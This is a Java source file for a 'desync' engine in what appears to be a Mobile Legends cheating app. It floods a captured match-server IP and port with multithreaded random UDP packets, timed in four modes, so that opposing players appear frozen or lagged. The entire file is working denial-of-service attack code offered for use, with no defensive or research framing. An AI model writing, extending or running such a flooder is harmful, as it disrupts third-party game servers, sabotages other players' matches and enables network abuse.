package com.paneer.mlbbipdetect;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Desync / "bot match" engine.
 *
 * Goal: make remote players appear frozen / delayed / bot-like by
 * disrupting the match server UDP stream that carries movement & skill sync.
 *
 * Modes:
 *  - JITTER   : burst flood + short pause (desync spikes)
 *  - HOLD     : continuous moderate flood (constant lag)
 *  - FREEZE   : heavy short bursts timed to movement windows
 *  - DROP_SIM : flood + random micro-pauses (packet loss feel)
 *
 * Works on the same captured match-server IP:port.
 * No root. Pure userspace UDP.
 */
public class DesyncEngine {

    public enum Mode {
        JITTER,
        HOLD,
        FREEZE,
        DROP_SIM
    }

    public interface Listener {
        void onStats(long packets, long bytes, int threads, String mode);
        void onError(String msg);
        void onStopped();
    }

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicLong packetsSent = new AtomicLong(0);
    private final AtomicLong bytesSent = new AtomicLong(0);
    private final List<Thread> workers = new ArrayList<>();
    private Listener listener;

    private String targetIp;
    private int targetPort;
    private int threadCount;
    private int packetSize;
    private Mode mode = Mode.JITTER;

    // intensity 1-10
    private int intensity = 5;

    public void setListener(Listener l) {
        this.listener = l;
    }

    public synchronized void start(String ip, int port, int threads, int size, Mode m, int intensity) {
        if (running.get()) return;
        this.targetIp = ip;
        this.targetPort = port;
        this.threadCount = Math.max(1, Math.min(threads, 24));
        this.packetSize = Math.max(64, Math.min(size, 1200));
        this.mode = m != null ? m : Mode.JITTER;
        this.intensity = Math.max(1, Math.min(intensity, 10));
        packetsSent.set(0);
        bytesSent.set(0);
        running.set(true);
        workers.clear();

        for (int i = 0; i < threadCount; i++) {
            Thread t = new Thread(new DesyncWorker(i), "desync-" + i);
            t.setPriority(Thread.NORM_PRIORITY + 1);
            workers.add(t);
            t.start();
        }

        Thread stats = new Thread(() -> {
            while (running.get()) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    break;
                }
                if (listener != null) {
                    listener.onStats(packetsSent.get(), bytesSent.get(), activeCount(), mode.name());
                }
            }
        }, "desync-stats");
        stats.setDaemon(true);
        stats.start();
    }

    public synchronized void stop() {
        running.set(false);
        for (Thread t : workers) t.interrupt();
        for (Thread t : workers) {
            try { t.join(600); } catch (InterruptedException ignored) {}
        }
        workers.clear();
        if (listener != null) listener.onStopped();
    }

    public boolean isRunning() {
        return running.get();
    }

    private int activeCount() {
        int n = 0;
        for (Thread t : workers) if (t.isAlive()) n++;
        return n;
    }

    private class DesyncWorker implements Runnable {
        private final int id;
        private final Random rnd = new Random(System.nanoTime() ^ id);

        DesyncWorker(int id) {
            this.id = id;
        }

        @Override
        public void run() {
            DatagramSocket socket = null;
            try {
                socket = new DatagramSocket();
                socket.setSoTimeout(0);
                InetAddress addr = InetAddress.getByName(targetIp);
                byte[] payload = new byte[packetSize];
                rnd.nextBytes(payload);
                DatagramPacket packet = new DatagramPacket(payload, payload.length, addr, targetPort);

                while (running.get()) {
                    switch (mode) {
                        case JITTER:
                            doJitter(socket, packet, payload);
                            break;
                        case HOLD:
                            doHold(socket, packet, payload);
                            break;
                        case FREEZE:
                            doFreeze(socket, packet, payload);
                            break;
                        case DROP_SIM:
                            doDropSim(socket, packet, payload);
                            break;
                    }
                }
            } catch (Exception e) {
                if (running.get() && listener != null) {
                    listener.onError("Desync worker " + id + ": " + e.getMessage());
                }
            } finally {
                if (socket != null) {
                    try { socket.close(); } catch (Exception ignored) {}
                }
            }
        }

        private void mutate(byte[] payload) {
            payload[0] = (byte) rnd.nextInt(256);
            payload[1] = (byte) (id & 0xFF);
            long t = System.nanoTime();
            payload[2] = (byte) (t & 0xFF);
            payload[3] = (byte) ((t >> 8) & 0xFF);
        }

        private void sendBurst(DatagramSocket socket, DatagramPacket packet, byte[] payload, int count) throws Exception {
            for (int i = 0; i < count && running.get(); i++) {
                mutate(payload);
                socket.send(packet);
                packetsSent.incrementAndGet();
                bytesSent.addAndGet(packetSize);
            }
        }

        /** Burst then pause — classic desync spike */
        private void doJitter(DatagramSocket socket, DatagramPacket packet, byte[] payload) throws Exception {
            int burst = 40 + intensity * 15;
            sendBurst(socket, packet, payload, burst);
            // pause 30-120ms depending on intensity (higher = shorter pause = heavier lag)
            int pause = Math.max(15, 140 - intensity * 12);
            Thread.sleep(pause + rnd.nextInt(40));
        }

        /** Continuous moderate pressure */
        private void doHold(DatagramSocket socket, DatagramPacket packet, byte[] payload) throws Exception {
            int burst = 8 + intensity * 3;
            sendBurst(socket, packet, payload, burst);
            Thread.sleep(Math.max(2, 25 - intensity * 2));
        }

        /** Heavy short freezes — movement looks frozen then snaps */
        private void doFreeze(DatagramSocket socket, DatagramPacket packet, byte[] payload) throws Exception {
            int burst = 80 + intensity * 25;
            sendBurst(socket, packet, payload, burst);
            // longer freeze window
            int freezeMs = 80 + intensity * 20 + rnd.nextInt(60);
            Thread.sleep(freezeMs);
            // tiny recovery gap
            Thread.sleep(20 + rnd.nextInt(30));
        }

        /** Random micro packet-loss feel */
        private void doDropSim(DatagramSocket socket, DatagramPacket packet, byte[] payload) throws Exception {
            int burst = 15 + intensity * 5;
            sendBurst(socket, packet, payload, burst);
            if (rnd.nextInt(100) < 20 + intensity * 4) {
                // simulate drop window
                Thread.sleep(50 + intensity * 15 + rnd.nextInt(80));
            } else {
                Thread.sleep(8 + rnd.nextInt(20));
            }
        }
    }
}
